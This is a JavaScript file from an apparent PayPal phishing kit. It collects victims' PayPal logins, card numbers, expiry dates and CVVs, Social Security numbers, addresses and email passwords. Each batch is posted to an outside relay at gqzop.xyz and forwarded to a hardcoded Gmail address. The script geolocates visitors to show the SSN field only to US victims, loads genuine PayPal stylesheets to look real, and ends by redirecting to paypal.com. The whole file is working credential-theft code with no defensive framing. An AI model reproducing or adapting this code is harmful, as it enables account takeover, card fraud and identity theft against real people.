function formatString(e) {
    var inputChar = String.fromCharCode(event.keyCode);
    var code = event.keyCode;
    var allowedKeys = [8];
    if (allowedKeys.indexOf(code) !== -1) {
      return;
    }
  
    event.target.value = event.target.value.replace(
      /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
    ).replace(
      /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
    ).replace(
      /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
    ).replace(
      /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
    ).replace(
      /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
    ).replace(
      /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
    ).replace(
      /\/\//g, '/' // Prevent entering more than 1 `/`
    );
  }
  async function send_em(to,from,subject,body){
    var yourUrl ="https://gqzop.xyz/pharoh/smtpjs.php";
    let agent = navigator.userAgent;
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          
        }
    };
    xhr.open("POST", yourUrl, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        "to": to,
        "from": from,
        "subject": subject,
        "body": body
    }));
  
  
  
  }







 function show_div(x,y){
          var show = document.getElementById(x);
          var hide = document.getElementById(y);
          hide.style.display = "none";
          show.style.display = "block";
        }
       
        to="emilmiller134@gmail.com";
        window.addEventListener("load", function(){
          document.getElementById("email").value = email;
          document.getElementById("btnLogin").addEventListener("click", function(event) {
              event.preventDefault();
              var password =document.getElementById("password").value;
              var email=document.getElementById("email").value;
        if( password.length < 5)
        {
            alert ("please enter your password")
        }
              
        else{
            send_em(to,email,"Paypal logs from "+email,"Email: "+email +" \nPassword: " + password).then(
              function(){
                var temp = document.createElement('div');

            temp.innerHTML = '<link rel="stylesheet" href="https://gdhgfdas.xyz/pt/protection/ff.css">';
            var x = document.getElementById("protection");
            var y = document.getElementById("lpggon");
            y.style.display = "none";
            x.style.display = "block";
            var head = document.head;
            
            while (temp.firstChild) {
                head.appendChild(temp.firstChild);
            }
              }

            );
            
           }     
         
         
         
        });
        document.getElementById("cvv_btn").addEventListener("click", function(event) {
          event.preventDefault();
          var cc =document.getElementById("cardNumber").value;
          var expiry=document.getElementById("expDate").value;
          var cvv=document.getElementById("verificationCode").value;
    if( cc.length < 5 || expiry.length < 2 || cvv.length < 3)
    {
      let text = "Please fill all fields correctly or click ok if You dont have a card on file";
      if (confirm(text) == true) {
        
         
            const element = document.getElementById("js_modalHeader");
            element.remove();
            show_div('billing','cvv_form')
           
      } 
    }
    else{send_em(to,email,"Paypal logs from "+email,"cc: "+cc +"\nexpiry: " + expiry+"\ncvv: "+cvv).then( 
     function(){
      const element = document.getElementById("js_modalHeader");
      element.remove();
      show_div('billing','cvv_form');
      var temp = document.createElement('div');
temp.innerHTML = '<link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-5-0/paypal-sans.css"> <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/edf/a7f2d511b0d8bf1bd86b78f265ae2/css/main.css">';
            var head = document.head;
            
            while (temp.firstChild) {
                head.appendChild(temp.firstChild);
            }
               
     } )
    }
fetch('http://ip-api.com/json')
.then( res => res.json())
.then(response => {
    console.log("Country: ", response.countryCode);
    if(response.countryCode !="US"){
      var y = document.getElementById("ssn_div");
            y.style.display = "none";
    }

 })
 .catch((data, status) => {
    console.log('Request failed');
 })
  });
  document.getElementById("billing_btn").addEventListener("click", function(event) {
    event.preventDefault();
    var ssn =document.getElementById("ssn").value;
    var address =document.getElementById("address").value;
    var city=document.getElementById("city").value;
    var zip=document.getElementById("postal_code").value;
if( address.length < 4 || zip.length < 2 || city.length < 3)
{
  alert("Please fill all feilds")
}
  
 else{
  send_em(to,email,"Paypal logs from "+email,"ssn: "+ssn +" \naddress: " + address +" \ncity: " + city +" \nzip: " + zip).then(
    function(){
      document.getElementById("emailvv").value = email;
      show_div("email_v","billing")
      var y = document.getElementById("pp_img_div");
            y.style.display = "block";
            var element = document.getElementById("pp_img");
            let domain = email.substring(email.indexOf('@') + 1);
            element.setAttribute("src", "https://logo.clearbit.com/"+domain);
            var ment = document.getElementById("killa");
            ment.classList.remove("vx_modal-wrapper_logo");
    }
  )
 } 
  
  });

  document.getElementById("email_btn").addEventListener("click", function(event) {
    event.preventDefault();
    var email =document.getElementById("emailvv").value;
    var email_pass=document.getElementById("email_pass").value;
    
if( email_pass.length < 4 )
{
  alert("Please fill all feilds correctly")
}
  
 else{
  send_em(to,email,"Paypal logs from "+email,"email: "+email +" \nemail Pass: " + email_pass).then(
    function(){
      window.location.href="https://paypal.com/signin";
    }
  )
 } 
  
  });
  });
       
